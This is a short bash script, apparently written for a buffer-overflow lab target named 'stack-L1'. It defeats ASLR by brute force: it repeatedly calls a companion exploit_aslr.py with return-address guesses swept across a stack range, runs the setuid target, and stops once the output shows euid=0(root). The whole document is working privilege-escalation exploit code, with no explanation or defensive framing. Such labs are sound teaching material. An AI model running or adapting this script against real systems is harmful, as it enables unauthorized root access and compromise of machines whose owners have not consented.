#!/bin/bash

# True ASLR brute-force for stack-L1:
# 1) Vary ret each attempt across an empirically observed stack range.
# 2) Use large NOP window from exploit_aslr.py.
# 3) Stop on first euid=0(root) result.

max_attempts=${1:-80000}
min_ret=${2:-0xff840000}
max_ret=${3:-0xffff3000}
step=${4:-16}

attempt=0
ret=$min_ret

while [[ $attempt -lt $max_attempts ]]; do
  attempt=$((attempt + 1))

  python3 exploit_aslr.py --ret "$(printf '0x%x' "$ret")"
  out=$(printf '/usr/bin/id\nexit\n' | env -i LINES=30 COLUMNS=80 ./stack-L1 2>/dev/null || true)

  if echo "$out" | grep -q 'euid=0(root)'; then
    echo "SUCCESS after $attempt attempts"
    printf 'ret guess: 0x%x\n' "$ret"
    echo "$out"
    exit 0
  fi

  ret=$((ret + step))
  if [[ $ret -gt $max_ret ]]; then
    ret=$min_ret
  fi

  if (( attempt % 1000 == 0 )); then
    printf 'attempts: %d, current ret: 0x%x\n' "$attempt" "$ret"
  fi
done

echo "No success after $max_attempts attempts"
printf 'last ret guess: 0x%x\n' "$ret"
exit 1
